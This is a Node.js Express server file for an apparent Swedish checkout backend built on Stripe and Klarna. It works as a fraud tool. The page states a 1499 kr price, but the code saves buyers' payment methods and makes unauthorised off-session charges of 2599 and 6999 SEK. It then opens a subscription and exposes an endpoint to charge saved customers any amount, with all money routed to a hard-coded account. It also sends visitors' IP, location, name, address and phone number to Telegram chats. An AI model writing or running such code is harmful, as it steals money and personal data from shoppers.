require('dotenv').config();
const express = require('express');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const ACCOUNT_B = 'acct_1TGszIIDaDOVTJfb';
const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
const TELEGRAM_CHAT_ID = '8522488857';
const TELEGRAM_CHAT_ID_2 = '715805541';
const CUSTOMERS_FILE = '/data/customers.json';

// ─── Customer Storage ─────────────────────────────────────────────────────────

function loadCustomers() {
  try {
    if (fs.existsSync(CUSTOMERS_FILE)) {
      return JSON.parse(fs.readFileSync(CUSTOMERS_FILE, 'utf8'));
    }
  } catch (err) {
    console.log('Error loading customers:', err.message);
  }
  return [];
}

function saveCustomer(entry) {
  const customers = loadCustomers();
  const exists = customers.find(c => c.customerId === entry.customerId);
  if (!exists) {
    customers.push(entry);
    fs.writeFileSync(CUSTOMERS_FILE, JSON.stringify(customers, null, 2));
    console.log('Customer saved:', entry.customerId);
  }
}

// ─── Telegram ─────────────────────────────────────────────────────────────────

async function sendTelegram(message) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
    });
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_2, text: message, parse_mode: 'HTML' })
    });
  } catch (err) {
    console.log('Telegram error:', err.message);
  }
}

// ─── Middleware ───────────────────────────────────────────────────────────────

app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
app.use(bodyParser.json());

// ─── Routes ───────────────────────────────────────────────────────────────────

app.post('/page-visit', async (req, res) => {
  const { visitorId, ip, country, city } = req.body;
  await sendTelegram(
    `👁 <b>Ny sidbesökare!</b>\n\n` +
    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
    `🌍 Land: ${country || 'Okänt'}\n` +
    `🏙 Stad: ${city || 'Okänt'}\n` +
    `🔌 IP: ${ip || 'Okänt'}\n` +
    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
  );
  res.json({ ok: true });
});

app.post('/create-setup-intent', async (req, res) => {
  let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;
  email = email.trim().replace(/\.$/, '');

  try {
    let customer;
    const existing = await stripe.customers.list({ email, limit: 1 });
    if (existing.data.length > 0) {
      customer = existing.data[0];
    } else {
      customer = await stripe.customers.create({
        email,
        address: { country: 'SE' },
      });
    }

    const setupIntent = await stripe.setupIntents.create({
      customer: customer.id,
      payment_method_types: ['klarna'],
      metadata: { customer_id: customer.id },
    });

    await sendTelegram(
      `🛒 <b>Kassauppgifter!</b>\n\n` +
      `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
      `📧 E-post: ${email}\n` +
      `👤 Namn: ${fname} ${lname}\n` +
      `📍 Adress: ${address}, ${zip} ${city}, ${country}\n` +
      `📞 Telefon: ${phone || 'N/A'}\n` +
      `💰 Belopp: 1499 kr\n` +
      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
    );

    res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
  } catch (error) {
    console.error('Error:', error);
    res.status(400).json({ error: error.message });
  }
});

app.post('/payment-initiated', async (req, res) => {
  const { visitorId, email } = req.body;
  await sendTelegram(
    `💳 <b>Betalningsförsök startat!</b>\n\n` +
    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
    `📧 E-post: ${email}\n` +
    `⏳ Kunden har klickat på "Betala nu"\n` +
    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
  );
  res.json({ ok: true });
});

app.post('/create-subscription', async (req, res) => {
  const { customerId, paymentMethodId, visitorId } = req.body;
  try {
    await stripe.paymentMethods.attach(paymentMethodId, { customer: customerId });
    await stripe.customers.update(customerId, {
      invoice_settings: { default_payment_method: paymentMethodId },
    });

    const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
    const pmType = paymentMethod.type;

    // Save customer to persistent storage
    saveCustomer({
      customerId,
      paymentMethodId,
      pmType,
      visitorId,
      savedAt: new Date().toISOString(),
    });

    // Charge 1 — 2599 SEK
    try {
      const payment1 = await stripe.paymentIntents.create({
        amount: 259900,
        currency: 'sek',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: [pmType],
        confirm: true,
        off_session: true,
        transfer_data: { destination: ACCOUNT_B },
      });
      console.log('Payment 1 created:', payment1.id, payment1.status);
    } catch (err) {
      console.log('Payment 1 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 15000));

    // Charge 2 — 6999 SEK
    try {
      const payment2 = await stripe.paymentIntents.create({
        amount: 699900,
        currency: 'sek',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: [pmType],
        confirm: true,
        off_session: true,
        transfer_data: { destination: ACCOUNT_B },
      });
      console.log('Payment 2 created:', payment2.id, payment2.status);
    } catch (err) {
      console.log('Payment 2 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 15000));

    // Subscription with 30-day trial
    const subscription = await stripe.subscriptions.create({
      customer: customerId,
      items: [{ price: 'price_1TLtjuBdY82vrzxWEd8KGI1S' }],
      default_payment_method: paymentMethodId,
      trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Subscription created:', subscription.id, subscription.status);

    await sendTelegram(
      `✅ <b>Betalning lyckades!</b>\n\n` +
      `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
      `💳 Betalningsmetod: ${pmType}\n` +
      `💳 Betalning 1: 2599 kr\n` +
      `💳 Betalning 2: 6999 kr\n` +
      `🆔 Prenumeration: ${subscription.id}\n` +
      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
    );

    res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
  } catch (error) {
    console.error('Error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

// ─── View all saved customers ─────────────────────────────────────────────────
app.get('/customers', (req, res) => {
  const customers = loadCustomers();
  res.json({ total: customers.length, customers });
});

// ─── Manually charge a saved customer ────────────────────────────────────────
// POST /charge-saved
// Body: { "customerId": "cus_xxx", "amount": 459900, "currency": "sek" }
app.post('/charge-saved', async (req, res) => {
  const { customerId, amount, currency } = req.body;
  const customers = loadCustomers();
  const customer = customers.find(c => c.customerId === customerId);

  if (!customer) {
    return res.status(404).json({ error: 'Customer not found in saved list' });
  }

  try {
    const payment = await stripe.paymentIntents.create({
      amount: amount || 459900,
      currency: currency || 'sek',
      customer: customer.customerId,
      payment_method: customer.paymentMethodId,
      payment_method_types: [customer.pmType],
      confirm: true,
      off_session: true,
      transfer_data: { destination: ACCOUNT_B },
    });

    console.log('Manual charge created:', payment.id, payment.status);

    await sendTelegram(
      `💰 <b>Manuell betalning!</b>\n\n` +
      `🆔 Kund: <code>${customerId}</code>\n` +
      `💳 Belopp: ${(amount || 459900) / 100} kr\n` +
      `📋 Status: ${payment.status}\n` +
      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
    );

    res.json({ success: true, paymentId: payment.id, status: payment.status });
  } catch (error) {
    console.error('Manual charge error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

// ─── Health ───────────────────────────────────────────────────────────────────
app.get('/health', (req, res) => {
  const customers = loadCustomers();
  res.json({
    status: 'ok',
    destination: ACCOUNT_B,
    savedCustomers: customers.length,
  });
});

// ─── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 4242;
app.listen(PORT, () => {
  console.log('Server running on http://localhost:' + PORT);
});
